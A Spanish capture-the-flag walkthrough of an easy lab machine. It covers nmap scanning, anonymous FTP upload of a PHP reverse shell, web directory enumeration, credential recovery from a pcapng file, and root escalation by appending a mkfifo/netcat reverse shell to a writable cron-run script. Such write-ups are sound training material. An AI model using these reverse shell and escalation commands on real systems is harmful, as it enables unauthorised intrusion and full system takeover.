Bienvenidos nuevamente. Tendremos una maquina un tanto facil en el que escanearemos puertos abiertos con la herramienta nmap, establecemos conexion ftp y enumeramos directorios ocultos en el servidor web. Generamos una revers shell en nuestro sistema, obtendremos credenciales de usuario mediante un archivo pcapng y escalaremos privilegios a root abusandonos de un script que dejo nuestro usuario.


# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-17 15:52:29 EDT for 23s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra 3 puertos abiertos. Navegamos al servidor web y observamos el page source para ver si encontramos algo. Solo una nota de comunicacion. 
Tenemos el servicio ftp abierto, establecemos una conexion como usuario Anonymous .

```bash
ftp IPTARGET

ftp> ls
229 Entering Extended Passive Mode (|||24305|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Jul 17 19:56 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

```

Encontramos una nota y una imagen. Si intentamos cargar archivos dentro del servicio, no nos dejara. Pero, al cambiar al directorio /ftp, podremos cargar archivos. Creamos nuestra reverse shell de PentestMonkey, y la cargamos dentro del servicio ftp.

```bash
ftp> cd ftp
250 Directory successfully changed.

ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||54045|)
150 Ok to send data.
100% |************************************************************************************************************************************************|  2584       12.83 MiB/s    00:00 ETA
226 Transfer complete.
2584 bytes sent in 00:00 (5.51 KiB/s)
```

Enumeramos directorios ocultos dentro del servidor web 

```bash
gobuster -u http://10.10.20.76 -w /usr/share/dirb/wordlists/big.txt -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/17 15:57:22 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/files (Status: 301)
/server-status (Status: 403)
=====================================================
2023/07/17 15:58:17 Finished
=====================================================
```

# Intrusion

Con nuestro shell cargado , nos dirigimos al directorio /files/ftp y clickeamos en nuestra shell.

```bash
# Nos ponemos en escucha
nc -nvlp LPORT

# Nos dirigimos
http://IPTARGET/files/ftp
Clickeamos shell.php

#Upgradeamos nuestra shell
script /dev/null -c bash
  CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```

Al lista la ruta actual, podemos ver un directorio inusual que contiene un archivo pcap para analizar con wireshark en nuestra maquina atacante.

```bash
cd incidents
python3 -m http.server 8080

# En nuestra maquina atacante
wget http://IPTARGET:8080/suspicious.pcapng

# Iniciamos wireshark
wireshark suspicious.pcapng # Paquete 195

# O simplemente
cat suspicious.pcapng 
```

Encontramos las credenciales de lennie y establecemos una conexion ssh.

```bash
ssh lennie@IPTARGET
```

# Priv.Escalation

Si listamos su ruta actual, podemos ver que tiene un directorio llamdo /scripts. Al investigarlo, podemos ver que llama al directorio /etc/print.sh del cual lanza un echo diciendo "Done!"

Para escalar privilegios, pondremos una revese shell dentro de /etc/print.sh y nos pondremos en escucha. Al pasar unos segundos, obtenemos una shell interactiva root.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f" >> /etc/print.sh

# Nos ponemos en escucha
nc -nvlp LPORT

# Esperamos unos segundos y seremos root.
```





